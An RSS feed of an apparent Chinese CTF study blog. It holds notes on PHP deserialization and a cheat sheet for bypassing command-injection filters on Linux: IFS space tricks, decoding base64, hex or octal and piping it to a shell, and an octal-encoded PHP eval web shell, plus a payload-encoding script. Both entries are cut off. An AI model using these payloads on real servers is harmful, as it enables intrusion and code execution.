<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Php on Alex lan</title><link>http://localhost:1313/tags/php/</link><description>Recent content in Php on Alex lan</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/php/index.xml" rel="self" type="application/rss+xml"/><item><title>php</title><link>http://localhost:1313/docs/network-security/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid><description>&lt;h2 id="反序列化">
 反序列化
 &lt;a class="anchor" href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96">#&lt;/a>
&lt;/h2>
&lt;p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。&lt;/p>
&lt;p>两个函数&lt;/p>
&lt;p>serialize 将对象格式化成有序的字符串&lt;/p>
&lt;p>unserialize 将字符串还原成原来的对象&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">test&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $a;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $b;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> __construct(){$this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;xiaoshizi&amp;#34;&lt;/span>;$this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;laoshizi&amp;#34;&lt;/span>;}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">happy&lt;/span>(){&lt;span style="color:#66d9ef">return&lt;/span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>;}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">test&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">serialize&lt;/span>($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出&lt;/p>
&lt;pre tabindex="0">&lt;code>O:4:&amp;#34;test&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:9:&amp;#34;xiaoshizi&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:8:&amp;#34;laoshizi&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>序列化后字符串的格式&lt;/p>
&lt;pre tabindex="0">&lt;code>O:4:&amp;#34;对象名&amp;#34;:变量数量:{s:变量名长度:&amp;#34;变量名&amp;#34;;s:变量值长度:&amp;#34;变量值&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:8:&amp;#34;laoshizi&amp;#34;;}
&lt;/code>&lt;/pre>&lt;h2 id="修饰符">
 修饰符
 &lt;a class="anchor" href="#%e4%bf%ae%e9%a5%b0%e7%ac%a6">#&lt;/a>
&lt;/h2>
&lt;p>如果变量前的修饰符是protected或private，先将代码的修饰符改为public进行序列化，再做修改&lt;/p>
&lt;pre tabindex="0">&lt;code>private =&amp;gt;%00class_name%00name 长度+类名长度+2
protected =&amp;gt;%00*%00name 长度+3
&lt;/code>&lt;/pre>&lt;p>php7.1+不敏感&lt;/p>
&lt;p>常见的魔术方法&lt;/p>
&lt;pre tabindex="0">&lt;code>__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
&lt;/code>&lt;/pre>&lt;h2 id="字符串逃逸">
 字符串逃逸
 &lt;a class="anchor" href="#%e5%ad%97%e7%ac%a6%e4%b8%b2%e9%80%83%e9%80%b8">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">repl&lt;/span>($s){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">str_replace&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;flag&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hack!&amp;#39;&lt;/span>, $s);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">A&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $user&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;admin&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $pwd&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;123456&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$a&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">A&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$u&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">serialize&lt;/span>($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> $u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$b&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">unserialize&lt;/span>($u);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> $b&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$b&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">pwd&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出，没问题&lt;/p></description></item><item><title>php命令执行linux绕过</title><link>http://localhost:1313/docs/network-security/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Clinux%E7%BB%95%E8%BF%87/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Clinux%E7%BB%95%E8%BF%87/</guid><description>&lt;p>在php中虽然有命令执行，但是过滤了很多，会让我们的难度变大&lt;/p>
&lt;h2 id="空格">
 空格
 &lt;a class="anchor" href="#%e7%a9%ba%e6%a0%bc">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>${IFS}
$IFS$9
&amp;gt;
&amp;lt;&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="inode">
 inode
 &lt;a class="anchor" href="#inode">#&lt;/a>
&lt;/h2>
&lt;p>打印文件的inode号&lt;/p>
&lt;pre tabindex="0">&lt;code>ls -i
tac `find / -inum incode号`
&lt;/code>&lt;/pre>&lt;p>在获取到inode号配合可以查找文件及所有子目录文件并打印&lt;/p>
&lt;pre tabindex="0">&lt;code>cat `find . -inum inode号`
&lt;/code>&lt;/pre>&lt;p>在linux 会优先执行反引号中的内容&lt;/p>
&lt;h2 id="tee">
 tee
 &lt;a class="anchor" href="#tee">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>欲执行命令 | tee 回显文件
如
l\s / | tee 1.txt

再访问1.txt


关键字被过滤 在中间加\
&lt;/code>&lt;/pre>&lt;h2 id="cat">
 cat
 &lt;a class="anchor" href="#cat">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>cat、tac、more、less、head、tail、nl、sed、sort、uniq
&lt;/code>&lt;/pre>&lt;h2 id="编码">
 编码
 &lt;a class="anchor" href="#%e7%bc%96%e7%a0%81">#&lt;/a>
&lt;/h2>
&lt;p>用base64，解密并执行&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">bHMgLWwK&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">base64&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">d&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;636174202f666c6167&amp;#34;&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">xxd&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#a6e22e">p&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#a6e22e">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ascii的八进制编码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>(&lt;span style="color:#a6e22e">printf&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\154\163&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>) &lt;span style="color:#f92672">--&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>(&lt;span style="color:#a6e22e">printf&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&lt;span style="color:#a6e22e">printf&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>}&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">写shell&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>{&lt;span style="color:#a6e22e">printf&lt;/span>,&lt;span style="color:#a6e22e">\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&lt;/span>&lt;span style="color:#e6db74">&amp;#34;}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"># 脚本
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">def encodeOctal(str):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> # 只显示八进制
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(&amp;#34;&lt;/span>&lt;span style="color:#a6e22e">八进制&lt;/span>&lt;span style="color:#e6db74">&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> for i in str:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(oct(ord(i)).replace(&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#a6e22e">o&lt;/span>&lt;span style="color:#e6db74">&amp;#34;, &amp;#34;&lt;/span>&lt;span style="color:#a6e22e">\\&lt;/span>&lt;span style="color:#e6db74">&amp;#34;), end=&amp;#34;&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> # 显示Linux八进制payload
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(&amp;#34;&lt;/span>&lt;span style="color:#a6e22e">\nlinux&lt;/span> &lt;span style="color:#a6e22e">payload&lt;/span>&lt;span style="color:#e6db74">&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> payload = &amp;#39;$(printf&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>IFS&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> for i in str:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> payload += oct(ord(i)).replace(&amp;#34;0o&amp;#34;, &amp;#34;\\&amp;#34;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> payload += &amp;#39;&lt;/span>&lt;span style="color:#e6db74">&amp;#34;)&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> print(payload)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">if __name__ == &amp;#39;__main__&amp;#39;:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> str = &amp;#34;&lt;/span>&lt;span style="color:#a6e22e">cat&lt;/span> &lt;span style="color:#a6e22e">flag_1s_here&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#a6e22e">flag_831b69012c67b35f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>&lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> encodeOctal(str)
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>分隔符&lt;/p></description></item></channel></rss>